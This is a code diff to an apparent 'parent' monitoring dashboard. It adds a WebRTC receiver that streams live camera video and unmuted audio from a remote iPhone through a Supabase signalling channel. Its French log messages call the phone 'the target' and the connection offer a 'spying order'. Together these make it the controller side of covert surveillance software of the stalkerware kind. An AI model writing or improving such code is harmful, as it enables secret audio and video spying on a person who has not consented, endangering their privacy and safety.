@@ -193,45 +193,65 @@ function renderMessage(m) {
 }
 
 // Camera control
-// Real-time Camera Reception
+// --- TRUE WEBRTC CAMERA RECEPTION ---
+let pc = null;
+const webrtcChannel = _supabase.channel('webrtc-room', { config: { broadcast: { self: false } } });
+
 async function setupCameraStream() {
     const videoPlaceholder = document.querySelector('.video-placeholder');
     const liveVideo = document.getElementById('live-video');
     const statusDot = document.querySelector('.status-dot');
+    
+    // Assure that video is visible
+    liveVideo.style.display = 'block';
+    if (document.getElementById('remote-live-img')) document.getElementById('remote-live-img').style.display='none';
+    
+    console.log("Initialisation du récepteur vidéo Parent...");
+    
+    if (pc) pc.close();
+    pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+    
+    // Quand on reçoit le flux, on l'affiche avec le son !
+    pc.ontrack = e => {
+        console.log("Flux reçu ! Lecture en cours...");
+        liveVideo.srcObject = e.streams[0];
+        // Ensure volume is on but muted attribute removed so audio plays
+        liveVideo.muted = false; 
+        liveVideo.volume = 1.0;
+        liveVideo.play();
+        if (videoPlaceholder) videoPlaceholder.style.display = 'none';
+        if (statusDot) {
+            statusDot.style.background = '#ef4444';
+            statusDot.textContent = 'REC';
+        }
+    };
 
-    // Hide local video player, use img for remote snapshots
-    liveVideo.style.display = 'none';
+    pc.onicecandidate = e => {
+        if (e.candidate) {
+            webrtcChannel.send({ type: 'broadcast', event: 'signal', payload: { candidate: e.candidate } });
+        }
+    };
 
-    _supabase.channel('live-frames')
-        .on('postgres_changes', { event: '*', schema: 'public', table: 'signaling', filter: 'device_id=eq.iphone-lucas-77' }, 
-        payload => {
-            if (payload.new && payload.new.type === 'frame') {
-                const base64Image = payload.new.payload.image;
-                
-                let liveImg = document.getElementById('remote-live-img');
-                if (!liveImg) {
-                    liveImg = document.createElement('img');
-                    liveImg.id = 'remote-live-img';
-                    liveImg.style.width = '100%';
-                    liveImg.style.height = '100%';
-                    liveImg.style.objectFit = 'cover';
-                    liveVideo.parentElement.appendChild(liveImg);
-                    if (videoPlaceholder) videoPlaceholder.style.display = 'none';
-                }
-                liveImg.src = base64Image;
-                
-                if (statusDot) {
-                    statusDot.style.background = '#ef4444';
-                    statusDot.textContent = 'REC';
-                }
-            }
-        })
-        .subscribe();
+    webrtcChannel.on('broadcast', { event: 'signal' }, async (payload) => {
+        const data = payload.payload;
+        if (data.answer) {
+            console.log("Réponse de la cible reçue. Connexion en cours...");
+            await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
+        } else if (data.candidate && pc) {
+            await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
+        }
+    }).subscribe(async (status) => {
+        if (status === 'SUBSCRIBED') {
+            console.log("Envoi de l'ordre d'espionnage (Offer)...");
+            const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });
+            await pc.setLocalDescription(offer);
+            webrtcChannel.send({ type: 'broadcast', event: 'signal', payload: { offer: offer } });
+        }
+    });
 }
 
-async function setupCamera(mode, withAudio) {
-    // Replaced by real remote streaming
-    console.log("Remote Camera Mode:", mode);
+function setupCamera(mode, withAudio) {
+    // Replaced by real remote streaming above
 }
 
 function updateDeviceStatusUI(s) {
